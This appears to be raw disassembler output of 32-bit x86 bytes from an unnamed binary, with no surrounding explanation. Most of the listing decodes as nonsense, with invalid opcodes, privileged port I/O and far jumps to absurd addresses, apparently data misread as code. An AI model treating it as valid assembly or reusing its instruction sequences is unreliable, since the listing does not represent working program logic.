  41c5c9:	jns    0x41c606
  41c5cb:	in     eax,dx
  41c5cc:	loope  0x41c5a3
  41c5ce:	fiadd  WORD PTR [esi+0x45]
  41c5d1:	fbld   TBYTE PTR [ebx+edi*4-0x70326ee2]
  41c5d8:	fidiv  WORD PTR [ebp+0x2ee0b990]
  41c5df:	or     DWORD PTR [eax],ebx
  41c5e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5e2:	sbb    DWORD PTR [ebp+0x54],edx
  41c5e5:	mov    eax,0xf75435fe
  41c5ea:	push   edi
  41c5eb:	jmp    0x41c663
	...
  41c655:	add    ch,al
  41c657:	and    edx,DWORD PTR [ecx-0xa4808db]
  41c65d:	jecxz  0x41c6a2
  41c65f:	and    ch,ch
  41c661:	call   0x310d:0x4d06797d
  41c668:	add    DWORD PTR [eax],eax
  41c66a:	inc    DWORD PTR [eax]
  41c66c:	add    BYTE PTR [eax],al
  41c66e:	xchg   ebp,eax
  41c66f:	jmp    0x41c6de
  41c671:	sbb    eax,0x7d853619
  41c676:	xor    BYTE PTR [eax+0x54ae997a],bh
  41c67c:	shl    DWORD PTR ds:0x34280df2,0xad
  41c683:	cdq    
  41c684:	inc    edi
  41c685:	test   al,0x58
  41c687:	popf   
  41c688:	lods   al,BYTE PTR ds:[esi]
  41c689:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41c68b:	shl    cl,cl
  41c68d:	jns    0x41c675
  41c68f:	push   cs
  41c690:	out    dx,eax
  41c691:	dec    edx
  41c692:	push   ds
  41c693:	lea    ebx,[ebp-0x72]
  41c696:	pop    ds
  41c697:	dec    ebp
  41c698:	outs   dx,DWORD PTR ds:[esi]
  41c699:	out    0xfc,eax
  41c69b:	retf   0xfe21
  41c69e:	cld    
  41c69f:	xchg   edx,eax
  41c6a0:	mov    al,ds:0x51d755da
  41c6a5:	out    0xb9,al
  41c6a7:	or     ch,BYTE PTR [eax]
  41c6a9:	ins    BYTE PTR es:[edi],dx
  41c6aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6ab:	das    
  41c6ac:	js     0x41c72a
  41c6ae:	jae    0x41c67e
  41c6b0:	jmp    0x154e:0x33005c70
  41c6b7:	out    dx,al
  41c6b8:	(bad)  
  41c6b9:	loopne 0x41c6e6
  41c6bb:	cmp    eax,0x9fd0907
  41c6c0:	add    eax,0xef3b7d61
  41c6c5:	jge    0x41c69c
  41c6c7:	mov    ebp,0xdd6b7941
  41c6cc:	xchg   esi,eax
  41c6cd:	js     0x41c6fe
  41c6cf:	mov    dl,0x42
  41c6d1:	xor    DWORD PTR [esp+ecx*2-0x69484356],ebx
  41c6d8:	test   al,0xff
  41c6da:	aam    0x15
  41c6dc:	in     al,dx
  41c6dd:	push   edi
  41c6de:	jmp    0xc386:0xf665ac7c
  41c6e5:	rol    BYTE PTR [edi+0x2b20c57e],cl
  41c6eb:	nop
  41c6ec:	xchg   edi,eax
  41c6ed:	test   DWORD PTR [ebp+esi*2+0x1704567],ebx
  41c6f4:	in     eax,dx
  41c6f5:	(bad)  
  41c6f7:	or     DWORD PTR [esp+ebx*1+0x30],0x46af6a7c
  41c6ff:	test   eax,0xe1d79fea
  41c704:	(bad)  
  41c705:	mov    ebx,es
  41c707:	adc    ebp,DWORD PTR [esi+0x60c8fa2c]
  41c70d:	cld    
  41c70e:	gs std 
  41c710:	and    esp,DWORD PTR [edx+0x16665a68]
  41c716:	xchg   DWORD PTR [edx-0x7f0f43],esi
  41c71c:	hlt    
  41c71d:	fimul  WORD PTR [esi+0x14]
  41c720:	rcr    DWORD PTR [ecx-0xfa4eb2d],cl
  41c726:	mov    ds:0xd9e8513e,eax
  41c72b:	nop
  41c72c:	jmp    0xed0d631a
  41c731:	xchg   ecx,eax
  41c732:	jns    0x41c6be
  41c734:	in     eax,dx
  41c735:	(bad)  
  41c737:	dec    esi
  41c738:	xchg   BYTE PTR [esi-0x11efc817],cl
  41c73e:	pop    ss
  41c73f:	pop    eax
  41c740:	mov    cs,WORD PTR [ebx+0x7890273f]
  41c746:	out    dx,eax
  41c747:	sub    al,0xfc
  41c749:	add    DWORD PTR [ebx],ecx
  41c74b:	jle    0x41c793
  41c74d:	mov    cl,0x25
  41c74f:	pop    ecx
  41c750:	sar    DWORD PTR [eax+edi*1-0x3a3c4cd0],1
  41c757:	loope  0x41c7c8
  41c759:	xor    eax,0xda570740
  41c75e:	pusha  
  41c75f:	loop   0x41c77f
  41c761:	call   0x3a5881c5
  41c766:	stc    
  41c767:	clc    
  41c768:	aad    0x16
  41c76a:	dec    edi
  41c76b:	pop    es
  41c76c:	ins    BYTE PTR es:[edi],dx
	...
  41c7d5:	add    dl,bl
  41c7d7:	add    edx,eax
  41c7d9:	xchg   bl,bl
  41c7db:	(bad)  
  41c7dc:	ficomp WORD PTR [ebp-0xf]
  41c7df:	cmp    DWORD PTR [esi],esi
  41c7e1:	lahf   
  41c7e2:	push   es
  41c7e3:	call   0x324eaea3
  41c7e8:	add    DWORD PTR [eax],eax
  41c7ea:	inc    DWORD PTR [eax]
  41c7ec:	add    BYTE PTR [eax],al
  41c7ee:	push   ebp
  41c7ef:	dec    ebx
  41c7f0:	jbe    0x41c870
  41c7f2:	mov    cl,0x5b
  41c7f4:	dec    ecx
  41c7f5:	push   es
  41c7f6:	push   ebp
  41c7f7:	test   DWORD PTR [ecx-0x485df155],ebx
  41c7fd:	test   al,0x77
  41c7ff:	ins    DWORD PTR es:[edi],dx
  41c800:	fstp   TBYTE PTR [eax-0x101a1efb]
  41c806:	repz popf 
  41c808:	into   
  41c809:	push   edx
  41c80a:	fsub   st,st(7)
  41c80c:	rcr    DWORD PTR [edx+esi*8],1
  41c80f:	lds    ebp,FWORD PTR ds:0xbfeb8b5
  41c815:	std    
  41c816:	inc    ebx
  41c817:	mov    dh,BYTE PTR [esp+edx*8]
  41c81a:	sar    BYTE PTR [eax],1
  41c81c:	jg     0x41c810
  41c81e:	push   cs
  41c81f:	cmp    eax,0xd07a7039
  41c824:	dec    esp
  41c825:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c826:	hlt    
  41c827:	add    eax,0x86b7b5ed
  41c82c:	or     DWORD PTR [eax+0x5834c192],ebp
  41c832:	ins    DWORD PTR es:[edi],dx
  41c833:	mov    bh,0x67
  41c835:	adc    BYTE PTR [ebp+esi*1-0x3b],cl
  41c839:	pop    edx
  41c83a:	bnd repz jmp 0x1f3c186c
  41c841:	iret   
  41c842:	ja     0x41c7ee
  41c844:	jp     0x41c88d
  41c846:	ret    0xd484
  41c849:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c84a:	mov    esp,0x4ce99c1b
  41c84f:	dec    ecx
  41c850:	add    eax,0xd7bf4b8f
  41c855:	sbb    eax,0xe99271dd
  41c85a:	mov    ah,0x61
  41c85c:	mov    ds:0x39959ac6,eax
  41c861:	fwait
  41c862:	ss sbb ebx,edx
  41c865:	stos   BYTE PTR es:[edi],al
  41c866:	cmp    BYTE PTR [edi],0x4b
  41c869:	into   
  41c86a:	test   eax,0xa53ae906
  41c86f:	sub    al,0x4a
  41c871:	add    bl,BYTE PTR [edi+0x3]
  41c874:	mov    edx,0x1ff34d5d
  41c879:	fdivr  DWORD PTR [ebp-0x4]
  41c87c:	arpl   WORD PTR [ecx-0x22],sp
  41c87f:	jmp    DWORD PTR [ebx+0x1f]
  41c882:	test   eax,0x130b7edb
  41c887:	cwde   
  41c888:	jg     0x41c88f
  41c88a:	call   edx
  41c88c:	dec    esi
  41c88d:	add    dl,BYTE PTR [ecx-0x70]
  41c890:	inc    DWORD PTR [esi+0x1f1f7c8]
  41c896:	sbb    DWORD PTR [ecx+0x5517be63],0xffffffd1
  41c89d:	cli    
  41c89e:	test   al,0x46
  41c8a0:	add    eax,0x607e1ac3
  41c8a5:	dec    eax
  41c8a6:	rcr    BYTE PTR [edx],cl
  41c8a8:	xlat   BYTE PTR ds:[ebx]
  41c8a9:	ins    DWORD PTR es:[edi],dx
  41c8aa:	mov    al,0xb
  41c8ac:	repz enter 0x2d30,0x7f
  41c8b1:	inc    esp
  41c8b2:	mov    esi,0x674944a6
  41c8b7:	int    0xcf
  41c8b9:	dec    edx
  41c8ba:	push   0x41424269
  41c8bf:	mov    al,ds:0xd1e81595
  41c8c4:	jmp    0x41c883
  41c8c6:	dec    ebx
  41c8c7:	push   cs
  41c8c8:	dec    ecx
  41c8c9:	repnz sub esp,edi
  41c8cc:	pop    esi
  41c8cd:	out    dx,eax
  41c8ce:	ss hlt 
  41c8d0:	or     BYTE PTR [ebx],dh
  41c8d2:	sbb    al,BYTE PTR [ecx+0x18ca9031]
  41c8d8:	mov    eax,0x39026d90
  41c8dd:	or     eax,0xb2bbe6c8
  41c8e2:	push   ecx
  41c8e3:	arpl   WORD PTR [ecx+0xcfab996],dx
  41c8e9:	sub    esi,DWORD PTR [edx+0x7b]
  41c8ec:	inc    esp
	...
  41c955:	add    BYTE PTR [ebx+0x34],ah
  41c958:	lods   eax,DWORD PTR ds:[esi]
  41c959:	xor    al,0xff
  41c95b:	mov    ebp,0x291877fb
  41c960:	cmp    eax,DWORD PTR [ecx]
  41c962:	imul   edi,edx,0x330b9ccf
  41c968:	add    DWORD PTR [eax],eax
  41c96a:	inc    DWORD PTR [eax]
  41c96c:	add    BYTE PTR [eax],al
  41c96e:	mov    cl,0xe4
  41c970:	ins    DWORD PTR es:[edi],dx
  41c971:	or     al,0x69
  41c973:	dec    ebx
  41c974:	femms  
  41c976:	(bad)  
  41c977:	pop    edi
  41c978:	cdq    
  41c979:	inc    esp
  41c97a:	xor    dl,BYTE PTR [ecx-0x36f0f642]
  41c980:	adc    dh,BYTE PTR [ebx]
  41c982:	jnp    0x41c9b1
  41c984:	out    dx,eax
  41c985:	int    0x1
  41c987:	mov    cl,0xea
  41c989:	inc    esp
  41c98a:	(bad)  
  41c98b:	pop    edi
  41c98c:	cmp    ebx,esp
  41c98e:	jge    0x41c921
  41c990:	sahf   
  41c991:	mov    ebp,0xc4fbf109
  41c996:	add    eax,0xd2e06e
  41c99b:	data16 cmc 
  41c99d:	fld1   
  41c99f:	nop
  41c9a0:	loopne 0x41ca14
  41c9a2:	shl    BYTE PTR [ecx+0x28d369de],0x44
  41c9a9:	aas    
  41c9aa:	ret    
  41c9ab:	ds inc esi
  41c9ad:	xchg   ebx,eax
  41c9ae:	stos   DWORD PTR es:[edi],eax
  41c9af:	test   edi,edi
  41c9b1:	lea    esi,[esi-0x58c2c5d8]
  41c9b7:	outs   dx,BYTE PTR ds:[esi]
  41c9b8:	adc    al,0x4b
  41c9ba:	ja     0x41ca06
  41c9bc:	sbb    DWORD PTR fs:[eax+0x2b22953c],ebx
  41c9c3:	sahf   
  41c9c4:	arpl   WORD PTR [esi-0x42],bp
  41c9c7:	push   0xffffffae
  41c9c9:	xor    eax,0x62fc3e21
  41c9ce:	jg     0x41c9f7
  41c9d0:	into   
  41c9d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9d2:	xchg   edx,eax
  41c9d3:	dec    edx
  41c9d4:	into   
  41c9d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9d6:	(bad)  
  41c9d7:	ds enter 0x7cf9,0x73
  41c9dc:	xchg   ebx,eax
  41c9dd:	push   0xffffffe3
  41c9df:	mov    ebp,0x95c5c56
  41c9e4:	mov    cl,0x5c
  41c9e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9e7:	enter  0x8702,0xc6
  41c9eb:	mov    ebp,0x67c02f0c
  41c9f0:	mov    ss,esp
  41c9f2:	jae    0x41c9c6
  41c9f4:	xor    BYTE PTR ds:[edi+0x72],cl
  41c9f8:	cdq    
  41c9f9:	dec    edx
  41c9fa:	jecxz  0x41c9ea
  41c9fc:	jmp    0x41c9e1
  41c9fe:	ins    WORD PTR es:[edi],dx
  41ca00:	jo     0x41ca79
  41ca02:	jb     0xecd9227c
  41ca08:	pop    ebx
  41ca09:	jmp    0x1665:0x6d706998
  41ca10:	cli    
  41ca11:	xchg   esp,eax
  41ca12:	mov    BYTE PTR [edx+esi*8],al
  41ca15:	mov    ah,0x1d
  41ca17:	in     al,0xa7
  41ca19:	push   esi
  41ca1a:	sahf   
  41ca1b:	mov    esi,0xeadbd26c
  41ca20:	mov    ds:0x2b306d1c,eax
  41ca25:	jp     0x41c9e7
  41ca27:	sbb    al,bh
  41ca29:	pop    esi
  41ca2a:	dec    ebp
  41ca2b:	dec    ebp
  41ca2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca2d:	in     eax,0xaf
  41ca2f:	pop    esp
  41ca30:	sti    
  41ca31:	shl    DWORD PTR [edi+0x40],0xce
  41ca35:	aad    0xb6
  41ca37:	stc    
  41ca38:	ja     0x41caaa
  41ca3a:	jmp    0x41ca46
  41ca3c:	neg    DWORD PTR [eax+ebp*8-0x16]
  41ca40:	sbb    DWORD PTR [edi-0x4b],ebp
  41ca43:	sbb    BYTE PTR [eax+ebx*4+0x7d],dh
  41ca47:	test   al,0x63
  41ca49:	ret    
  41ca4a:	adc    bh,BYTE PTR [edx-0x4a]
  41ca4d:	bound  edi,QWORD PTR [ebx+0x24]
  41ca50:	add    al,0xdc
  41ca52:	dec    eax
  41ca53:	aad    0xee
  41ca55:	leave  
  41ca56:	push   0xc47d6237
  41ca5b:	inc    ecx
  41ca5c:	mov    ?,WORD PTR [edi+0x3]
  41ca5f:	jae    0x41caa5
  41ca61:	iret   
  41ca62:	mov    eax,0x8634f5ea
  41ca67:	sbb    al,bl
  41ca69:	push   ebx
  41ca6a:	lds    ecx,FWORD PTR [esi]
  41ca6c:	bound  eax,QWORD PTR [eax]
	...
  41cad6:	lock retf 0xfc94
  41cada:	mov    esi,0xc1cef8fe
  41cadf:	or     al,BYTE PTR [ebx+0x0]
  41cae2:	(bad)  
  41cae3:	adc    eax,0x340a4db4
  41cae8:	add    DWORD PTR [eax],eax
  41caea:	inc    DWORD PTR [eax]
  41caec:	add    BYTE PTR [eax],al
  41caee:	clc    
  41caef:	pusha  
  41caf0:	add    DWORD PTR [ebp+0x4e],ecx
  41caf3:	(bad)  
  41caf4:	push   cs
  41caf5:	jl     0x41cb06
  41caf7:	and    dh,bl
  41caf9:	pop    eax
  41cafa:	dec    edi
  41cafb:	std    
  41cafc:	jecxz  0x41ca9f
  41cafe:	jo     0x41cb0b
  41cb00:	jns    0x41caea
  41cb02:	dec    eax
  41cb03:	stos   BYTE PTR es:[edi],al
  41cb04:	push   ebx
  41cb05:	jmp    0x8565800f
  41cb0a:	and    al,0x23
  41cb0c:	add    eax,0xc1b0ae7d
  41cb11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb12:	stos   BYTE PTR es:[edi],al
  41cb13:	inc    ebx
  41cb14:	ret    0x9980
  41cb17:	or     BYTE PTR [esi+esi*8-0x3a],bl
  41cb1b:	inc    esi
  41cb1c:	call   0x454422de
  41cb21:	dec    ecx
  41cb22:	and    BYTE PTR [eax-0x65d3f5aa],dl
  41cb28:	(bad)  [edx+esi*1-0x543450c]
  41cb2f:	inc    ebx
  41cb30:	add    al,0xed
  41cb32:	or     BYTE PTR [ebx],al
  41cb34:	sti    
  41cb35:	loopne 0x41cafd
  41cb37:	xor    dl,BYTE PTR [eax+0x3e]
  41cb3a:	pop    edi
  41cb3b:	xor    bl,BYTE PTR [esi+0x36]
  41cb3e:	jmp    0x41cb31
  41cb40:	push   es
  41cb41:	sub    esi,DWORD PTR [ebx+edx*8+0x59209578]
  41cb48:	lods   al,BYTE PTR ds:[esi]
  41cb49:	mov    cl,0xa0
  41cb4b:	mov    ds:0x2d599d0d,eax
  41cb50:	scas   al,BYTE PTR es:[edi]
  41cb51:	cmp    ecx,DWORD PTR [esp+esi*8]
  41cb54:	lea    ecx,fs:[edx]
  41cb57:	retf   
  41cb58:	mov    ecx,DWORD PTR [edi]
  41cb5a:	mov    ds:0xa9e9576,al
  41cb5f:	jae    0x41cb78
  41cb61:	mov    bl,0xf4
  41cb63:	cmp    eax,0x1e334b84
  41cb68:	scas   eax,DWORD PTR es:[edi]
  41cb69:	scas   al,BYTE PTR es:[edi]
  41cb6a:	mov    ah,0x6a
  41cb6c:	fmul   QWORD PTR [ebx+ecx*2+0x8]
  41cb70:	cmp    cl,BYTE PTR [esp+0x72f4acbe]
  41cb77:	or     ebp,DWORD PTR [esi]
  41cb79:	fidivr WORD PTR [ecx+0x22]
  41cb7c:	jbe    0x41cb07
  41cb7e:	pop    ecx
  41cb7f:	int    0x48
  41cb81:	or     al,0x8a
  41cb83:	in     al,0x1e
  41cb85:	or     ch,dl
  41cb87:	les    ebx,FWORD PTR [eax-0x3014070]
  41cb8d:	xchg   edx,eax
  41cb8e:	and    eax,0x85d7fdf4
  41cb93:	shl    ebx,0xdd
  41cb96:	test   al,0xbe
  41cb98:	mov    cl,cl
  41cb9a:	aam    0x3b
  41cb9c:	sahf   
  41cb9d:	js     0x41cbeb
  41cb9f:	dec    ebp
  41cba0:	jb     0x41cb70
  41cba2:	push   ss
  41cba3:	mov    bl,0x8e
  41cba5:	push   cs
  41cba6:	ficomp DWORD PTR [edi]
  41cba8:	push   ebp
  41cba9:	hlt    
  41cbaa:	mov    ah,BYTE PTR [edi-0x7cd8c673]
  41cbb0:	retf   
  41cbb1:	pop    edx
  41cbb2:	cdq    
  41cbb3:	xor    ebp,DWORD PTR [edi-0xadac978]
  41cbb9:	iret   
  41cbba:	retf   
  41cbbb:	stc    
  41cbbc:	pop    DWORD PTR [ebx-0x1e]
  41cbbf:	inc    edi
  41cbc0:	jne    0x41cb5d
  41cbc2:	lds    edx,FWORD PTR [edi]
  41cbc4:	jmp    0x41cbbe
  41cbc6:	addr16 loopne 0x41cb79
  41cbc9:	cmp    esp,DWORD PTR [ebx-0x1f]
  41cbcc:	pop    ds
  41cbcd:	mov    cl,0x92
  41cbcf:	imul   esp,DWORD PTR [ecx+0x7e],0x3bdce1cf
  41cbd6:	push   ds
  41cbd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cbd8:	sub    BYTE PTR [ecx],bl
  41cbda:	add    BYTE PTR [edx-0x6a],bh
  41cbdd:	mov    ds:0x73ad435b,eax
  41cbe2:	push   ecx
  41cbe3:	mov    ebx,0xf997249c
  41cbe8:	xor    eax,0x67ec016b
	...
  41cc55:	add    BYTE PTR [ecx],ch
  41cc57:	(bad)  
  41cc58:	sti    
  41cc59:	pop    ebp
  41cc5a:	(bad)  
  41cc5b:	jge    0x41cc0c
  41cc5d:	neg    cl
  41cc5f:	hlt    
  41cc60:	add    eax,0x260e7c22
  41cc65:	and    DWORD PTR [ecx],ecx
  41cc67:	xor    eax,0xff0001
  41cc6c:	add    BYTE PTR [eax],al
  41cc6e:	je     0x41ccbb
  41cc70:	lods   eax,DWORD PTR ds:[esi]
  41cc71:	inc    eax
  41cc72:	(bad)  
  41cc73:	clc    
  41cc74:	sti    
  41cc75:	dec    edi
  41cc76:	push   esp
  41cc77:	sbb    esi,0x2d11b053
  41cc7d:	bound  ebx,QWORD PTR [edi+0xa]
  41cc80:	lds    edx,FWORD PTR [edx-0x2922cdf2]
  41cc86:	mov    eax,0x47e373ca
  41cc8b:	daa    
  41cc8c:	aad    0x99
  41cc8e:	scas   eax,DWORD PTR es:[edi]
  41cc8f:	mov    edi,esp
  41cc91:	popa   
  41cc92:	push   eax
  41cc93:	jnp    0x41ccc6
  41cc95:	aaa    
  41cc96:	loop   0x41ccdf
  41cc98:	aad    0x90
  41cc9a:	xchg   edx,eax
  41cc9b:	ret    
  41cc9c:	ds inc ebp
  41cc9e:	pop    es
  41cc9f:	and    al,0x4a
  41cca1:	es cli 
  41cca3:	and    eax,0xd7484bea
  41cca8:	push   eax
  41cca9:	js     0x41cc3e
  41ccab:	xor    ah,cl
  41ccad:	or     eax,DWORD PTR [esi+0x1c292925]
  41ccb3:	ret    0x819f
  41ccb6:	ret    0xdf9d
  41ccb9:	call   0x84100b33
  41ccbe:	js     0x41cc55
  41ccc0:	out    0x8b,eax
  41ccc2:	out    0x50,al
  41ccc4:	int    0xe
  41ccc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ccc7:	(bad)
  41cccb:	js     0x41ccb8
  41cccd:	jbe    0x41cd49
  41cccf:	les    ebp,FWORD PTR [esi]
  41ccd1:	push   ebp
  41ccd2:	mov    edi,0xd5be4801
  41ccd7:	into   
  41ccd8:	xchg   BYTE PTR [edx-0x366a6c2],ah
  41ccde:	or     BYTE PTR [edx-0x2c],dl
  41cce1:	mov    cl,0x94
  41cce3:	data16 ins BYTE PTR es:[edi],dx
  41cce5:	dec    edx
  41cce6:	add    BYTE PTR [edi+0x79],al
  41cce9:	inc    esi
  41ccea:	xchg   esi,eax
  41cceb:	pop    ecx
  41ccec:	and    al,0xac
  41ccee:	mov    ebx,0x1c7b8f20
  41ccf3:	cmp    BYTE PTR ds:0x948fd0cb,0xeb
  41ccfa:	jns    0x41cce3
  41ccfc:	aam    0x32
  41ccfe:	dec    esp
  41ccff:	sub    BYTE PTR [ebx+edi*1],al
  41cd02:	mov    eax,ds:0xf6a6a07d
  41cd07:	xor    bl,BYTE PTR [ecx-0x566c1160]
  41cd0d:	out    0x9,eax
  41cd0f:	xchg   esi,eax
  41cd10:	(bad)  
  41cd11:	jge    0x41cd13
  41cd13:	inc    edx
  41cd14:	retf   0xb000
  41cd17:	sbb    edi,edx
  41cd19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd1a:	sti    
  41cd1b:	mov    WORD PTR [ebp+0x2d],es
  41cd1e:	xor    esp,ebx
  41cd20:	call   FWORD PTR [ebx+esi*2]
  41cd23:	daa    
  41cd24:	int    0xb9
  41cd26:	hlt    
  41cd27:	jns    0x41ccb3
  41cd29:	iret   
  41cd2a:	inc    edx
  41cd2b:	dec    DWORD PTR [esi-0x38]
  41cd2e:	scas   eax,DWORD PTR es:[edi]
  41cd2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd30:	imul   BYTE PTR [ebx+0x757050a0]
  41cd36:	or     eax,0x5e582a8c
  41cd3b:	sub    al,0x4d
  41cd3d:	mov    cl,0x94
  41cd3f:	mov    ds:0x3913ad05,eax
  41cd44:	les    edi,FWORD PTR [ecx]
  41cd46:	imul   ebp,DWORD PTR [edi+esi*1+0x64],0xffffffac
  41cd4b:	outs   dx,DWORD PTR ds:[esi]
  41cd4c:	and    BYTE PTR [ecx],ch
  41cd4e:	fist   WORD PTR [ebp+0x46]
  41cd51:	shl    BYTE PTR [edx+0x412891e5],1
  41cd57:	sbb    ebp,DWORD PTR [esi]
  41cd59:	cwde   
  41cd5a:	loope  0x41cced
  41cd5c:	aad    0x10
  41cd5e:	stc    
  41cd5f:	int    0x2b
  41cd61:	lea    esi,[edx]
  41cd63:	popf   
  41cd64:	pop    esi
  41cd65:	test   DWORD PTR [edi+0x19],esp
  41cd68:	mov    ebp,0x6552ce96
	...
  41cdd5:	add    BYTE PTR [eax-0x67],ah
  41cdd8:	fsubr  st(5),st
  41cdda:	std    
  41cddb:	in     eax,0x79
  41cddd:	popf   
  41cdde:	in     al,dx
  41cddf:	stc    
  41cde0:	jmp    0x41ce12
  41cde2:	aaa    
  41cde3:	or     cl,BYTE PTR [edi]
  41cde5:	pop    es
  41cde6:	or     BYTE PTR [esi],dh
  41cde8:	add    DWORD PTR [eax],eax
  41cdea:	inc    DWORD PTR [eax]
  41cdec:	add    BYTE PTR [eax],al
  41cdee:	pusha  
  41cdef:	push   esi
  41cdf0:	push   es
  41cdf1:	out    0x19,eax
  41cdf3:	lds    esp,FWORD PTR [esi+0x3a505f02]
  41cdf9:	scas   al,BYTE PTR es:[edi]
  41cdfa:	dec    edi
  41cdfb:	xor    ebx,DWORD PTR [edi-0x74352bfa]
  41ce01:	popa   
  41ce02:	sbb    al,BYTE PTR [eax+0x4e]
  41ce05:	push   es
  41ce06:	mov    ?,WORD PTR [edx-0x55]
  41ce09:	and    ecx,DWORD PTR [eax]
  41ce0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce0c:	lock imul esp,DWORD PTR [ebp-0x25],0xf59402bc
  41ce14:	pop    esi
  41ce15:	pop    ss
  41ce16:	adc    eax,0xa27a90af
  41ce1b:	push   edi
  41ce1c:	fidiv  WORD PTR [eax+edx*1-0x2f26674]
  41ce23:	add    DWORD PTR [edx+0x7],eax
  41ce26:	or     ah,cl
  41ce28:	jl     0x41cdb4
  41ce2a:	test   BYTE PTR [edx+0x6f],dl
  41ce2d:	jbe    0x41ce7d
  41ce2f:	enter  0x5c68,0x8a
  41ce33:	adc    BYTE PTR [ebp-0x2e38f7df],0x27
  41ce3a:	pop    es
  41ce3b:	and    DWORD PTR [edx+0x6b],edx
  41ce3e:	pop    ebp
  41ce3f:	leave  
  41ce40:	fst    DWORD PTR [edx]
  41ce42:	sub    ch,0x9f
  41ce45:	push   ss
  41ce46:	stos   DWORD PTR es:[edi],eax
  41ce47:	daa    
  41ce48:	and    ah,BYTE PTR [ecx+0x7b]
  41ce4b:	retf   
  41ce4c:	into   
  41ce4d:	push   ebx
  41ce4e:	xchg   ecx,eax
  41ce4f:	xchg   BYTE PTR [esp+ebp*1+0x6b],dl
  41ce53:	cdq    
  41ce54:	ds call 0x61d4:0xfe80b4e5
  41ce5c:	jnp    0x41ce45
  41ce5e:	ret    0x15bf
  41ce61:	mov    cl,ch
  41ce63:	fcomp  QWORD PTR [eax+0x64]
  41ce66:	(bad)  
  41ce67:	imul   ebp,DWORD PTR [eax+0x6faa4e81],0xf7d435d1
  41ce71:	stos   DWORD PTR es:[edi],eax
  41ce72:	popf   
  41ce73:	out    0xf2,eax
  41ce75:	and    ebp,DWORD PTR [ebx-0x586cf815]
  41ce7b:	lds    esp,FWORD PTR [esi-0x62]
  41ce7e:	dec    ecx
  41ce7f:	rol    DWORD PTR [edx],0x99
  41ce82:	sbb    edi,DWORD PTR [ebp+0x4e]
  41ce85:	sahf   
  41ce86:	repnz or ecx,DWORD PTR [eax-0x3b]
  41ce8a:	jbe    0x41ce8a
  41ce8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce8d:	add    al,0x78
  41ce8f:	std    
  41ce90:	mov    ch,0x12
  41ce92:	and    BYTE PTR [ecx],al
  41ce94:	push   ebp
  41ce95:	iret   
  41ce96:	xor    al,0x1a
  41ce98:	mov    ebx,0x49255142
  41ce9d:	arpl   WORD PTR [esp+ecx*2-0x2d5a10e4],bp
  41cea4:	adc    eax,0xb1891b3c
  41cea9:	xor    al,BYTE PTR ds:[ebp+0x6cf3e1e7]
  41ceb0:	and    eax,0x249fe628
  41ceb5:	addr16 mov bl,0x43
  41ceb8:	mov    BYTE PTR [edi+0x25d64baa],0xf2
  41cebf:	and    bh,al
  41cec1:	pop    es
  41cec2:	aam    0xe5
  41cec4:	hlt    
  41cec5:	xchg   edi,eax
  41cec6:	retf   0x1a96
  41cec9:	int3   
  41ceca:	lock ds or esi,edi
  41cece:	and    BYTE PTR [eax+0x2aabe73],bl
  41ced4:	pop    esp
  41ced5:	or     BYTE PTR [ebx+ecx*1],0xf7
  41ced9:	call   0xba6e:0x39e9987f
  41cee0:	mov    ds:0xfe8ee3e6,eax
  41cee5:	xchg   DWORD PTR [ebx+edi*4+0x3e11fc72],ecx
  41ceec:	rol    BYTE PTR [eax],0x0
	...
  41cf53:	add    BYTE PTR [eax],al
  41cf55:	add    BYTE PTR [edi],al
  41cf57:	jp     0x41cf41
  41cf59:	jnp    0x41cf58
  41cf5b:	sti    
  41cf5c:	xchg   edi,eax
  41cf5d:	jle    0x41cfa6
  41cf5f:	jp     0x41cf3b
  41cf61:	lods   al,BYTE PTR ds:[esi]
  41cf62:	xchg   ecx,eax
  41cf63:	cld    
  41cf64:	xchg   esi,eax
  41cf65:	lea    eax,[edi]
  41cf67:	aaa    
  41cf68:	add    DWORD PTR [eax],eax
  41cf6a:	inc    DWORD PTR [eax]
  41cf6c:	add    BYTE PTR [eax],al
  41cf6e:	inc    ecx
  41cf6f:	nop
  41cf70:	js     0x41cef2
  41cf72:	jns    0x41cfeb
  41cf74:	sub    BYTE PTR [ecx+0x79],dh
  41cf77:	pushf  
  41cf78:	adc    BYTE PTR [ecx+ebx*2+0x1],cl
  41cf7c:	cmp    dh,BYTE PTR [eax-0x52e5b79b]
  41cf82:	inc    ebx
  41cf83:	pop    ebp
  41cf84:	lods   eax,DWORD PTR ds:[esi]
  41cf85:	pop    eax
  41cf86:	push   ds
  41cf87:	lock and ah,BYTE PTR [edx+0x61]
  41cf8b:	frstor [ebx-0x19419599]
  41cf91:	and    dh,dl
  41cf93:	dec    edi
  41cf94:	mov    ecx,0x73323805
  41cf99:	jle    0x41cf40
  41cf9b:	hlt    
  41cf9c:	add    DWORD PTR ds:0xc884e6b4,esi
  41cfa2:	iret   
  41cfa3:	mov    esp,eax
  41cfa5:	pop    ds
  41cfa6:	imul   eax,esp,0xffffffc2
  41cfa9:	in     al,0x7e
  41cfab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfac:	imul   esi
  41cfae:	cmp    edi,DWORD PTR [edx]
  41cfb0:	xor    BYTE PTR [esi+esi*4],ch
  41cfb3:	je     0x41cfe7
  41cfb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfb7:	xlat   BYTE PTR ds:[ebx]
  41cfb8:	push   ebp
  41cfb9:	mov    ch,BYTE PTR [eax]
  41cfbb:	leave  
  41cfbc:	popf   
  41cfbd:	pop    ecx
